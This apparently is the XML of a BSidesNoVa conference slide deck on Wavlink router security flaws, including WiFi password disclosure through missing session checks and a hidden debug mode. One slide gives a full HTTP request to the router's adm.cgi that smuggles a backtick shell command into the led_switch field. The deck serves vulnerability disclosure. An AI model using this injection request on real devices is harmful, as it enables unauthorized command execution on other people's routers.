              <a:sym typeface="Urbanist Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418" name="Google Shape;418;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="308950" y="826625"/>
            <a:ext cx="8588700" cy="36990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Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Incorrect access controls continue to be a problem in 2025.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>If you can access the web port from either the WAN or LAN you can get the wifi password</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>No session token verification</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-336550" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Awaiting MITRE CVE assignment</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="419" name="Google Shape;419;p52"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="163350" y="2272969"/>
            <a:ext cx="8817299" cy="2252656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="Google Shape;420;p52"/>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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8605500" cy="510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200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>A video is worth 1001 words</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426" name="Google Shape;426;p53" title="wifi-password-disclosure.mp4">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="639225"/>
            <a:ext cx="8722426" cy="4079975"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="427" name="Google Shape;427;p53"/>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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8385000" cy="4980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3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Look f</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>amiliar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>? </a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="Google Shape;433;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="296375" y="944725"/>
            <a:ext cx="8625900" cy="36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endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="Google Shape;434;p54"/>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
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="1136150"/>
            <a:ext cx="8740800" cy="3624600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F7F7F7"/>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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>POST /cgi-bin/adm.cgi HTTP/1.1</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Host: wavlogin.link</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Content-Length: 49</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Accept-Language: en-US,en;q=0.9</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User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</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Content-Type: text/plain;charset=UTF-8</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Accept: */*</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Origin: http://wavlogin.link</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Referrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>: http://wavlogin.link/ledonoff.shtml?r=34561</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Accept-Encoding: gzip, deflate, br</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Cookie: session=1052879378</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Connection: keep-alive</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>page=ledonoff&amp;led_switch=on</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>`/bin/ls&gt;/tmp/xxx.out`</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436" name="Google Shape;436;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="253150" y="703900"/>
            <a:ext cx="8669100" cy="382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Char char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Awaiting MITRE CVE assignment</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="86871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solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sometimes failure leads to something neat</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="Google Shape;442;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="271675" y="697750"/>
            <a:ext cx="8643900" cy="3834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sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What stands out here?</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New discovery?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="443" name="Google Shape;443;p55"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332600" y="1469575"/>
            <a:ext cx="6677025" cy="3127400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="444" name="Google Shape;444;p55"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="449" name="Google Shape;449;p56"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1481925" y="1031175"/>
            <a:ext cx="7433776" cy="3554149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="450" name="Google Shape;450;p56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="118723" y="159150"/>
            <a:ext cx="294975" cy="68060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1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451" name="Google Shape;451;p56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="768397" y="3904724"/>
            <a:ext cx="546825" cy="680600"/>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2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452" name="Google Shape;452;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1982075" y="148200"/>
            <a:ext cx="6742800" cy="413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solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(somewhat) Hidden debug mode</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="453" name="Google Shape;453;p56"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="642575" y="255275"/>
            <a:ext cx="4596700" cy="488350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="454" name="Google Shape;454;p56"/>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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="216250" y="111250"/>
            <a:ext cx="85764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b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>This talk is scratching the surface…</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="460" name="Google Shape;460;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="143925" y="604700"/>
            <a:ext cx="6867525" cy="523875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="461" name="Google Shape;461;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="143925" y="1231925"/>
            <a:ext cx="6877050" cy="314325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462" name="Google Shape;462;p57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228450" y="4719200"/>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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BsidesNoVa</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="463" name="Google Shape;463;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="216250" y="1728400"/>
            <a:ext cx="4306550" cy="2047250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="464" name="Google Shape;464;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4641800" y="2416725"/>
            <a:ext cx="4316400" cy="184428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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="290450"/>
            <a:ext cx="3655800" cy="981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solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thank you, questions?</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470" name="Google Shape;470;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4679825"/>
            <a:ext cx="2700000" cy="236400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BsidesNoVa</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471" name="Google Shape;471;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892200" y="290450"/>
            <a:ext cx="36558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solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Citations:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="472" name="Google Shape;472;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4311075" y="985738"/>
            <a:ext cx="4486200" cy="35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dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://www.wavlink.com/en_us/product/WL-WN530G3.html</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://www.wavlink.com/en_us/firmware.html</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://engineering.purdue.edu/dcsl/publications/papers/2023/firmware-issrew23.pdf</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://www.usenix.org/conference/raid2019/presentation/gustafson</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://talosintelligence.com/vulnerability_reports/TALOS-2024-2036</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
